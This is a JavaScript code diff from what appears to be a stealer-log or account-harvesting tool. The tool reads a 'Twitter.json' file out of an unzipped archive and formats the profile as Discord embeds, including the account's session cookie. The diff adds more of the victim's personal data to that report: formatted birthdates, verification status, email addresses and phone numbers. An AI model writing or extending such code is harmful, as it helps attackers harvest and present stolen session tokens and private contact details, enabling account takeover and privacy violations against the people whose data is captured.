@@ -139,6 +139,8 @@ const json = async (zipFile) => {
 
   if (fs.existsSync(join(getTempFolder(), 'Twitter.json'))) {
     const profile = JSON.parse(fs.readFileSync(join(getTempFolder(), 'Twitter.json'), 'utf8'));
+    const birthDate = profile.extended_profile?.birthdate;
+    const formatNumber = (n) => n >= 10 ? n : `0${n}`;
 
     embeds.push({
       author: {
@@ -153,9 +155,11 @@ const json = async (zipFile) => {
         ['🐦 Tweets', profile.statuses_count],
         ['🗺️ Location', profile.location || 'No location set'],
         ['🔗 URL', profile.url || 'No URL set'],
-        ['🎂 Birthday date', `${profile.extended_profile.birthdate.day}/${profile.extended_profile.birthdate.month}/${profile.extended_profile.birthdate.year}`],
+        ['🎂 Birthday date', birthDate ? `${formatNumber(birthDate.day)}/${formatNumber(birthDate.month)}/${birthDate.year}` : 'No birthdate set'],
         ['➕ Account created', `<t:${Math.floor(new Date(profile.created_at).getTime() / 1000)}>`],
-        ['✅ Verified?', profile.verified],
+        ['✅ Verified?', profile.verified || profile.user?.is_blue_verified ? `Yes (${profile.user?.legacy?.verified_type || 'Twitter Blue'})` : 'No'],
+        ['✉️ Email addresses', profile.emails && profile.emails.length && profile.emails.length > 0 ? profile.emails.map(e => `\`${e.email}\``).join(', ') : 'No emails addresses'],
+        ['📞 Phone Numbers', profile.phones && profile.phones.length && profile.phones.length > 0 ? profile.phones.map(p => `\`${p.phone_number}\``).join(', ') : 'No phone numbers'],
         ['🍪 Cookie', codeBlock(profile.cookie), false]
       ].map(fieldsMap),
       thumbnail: {
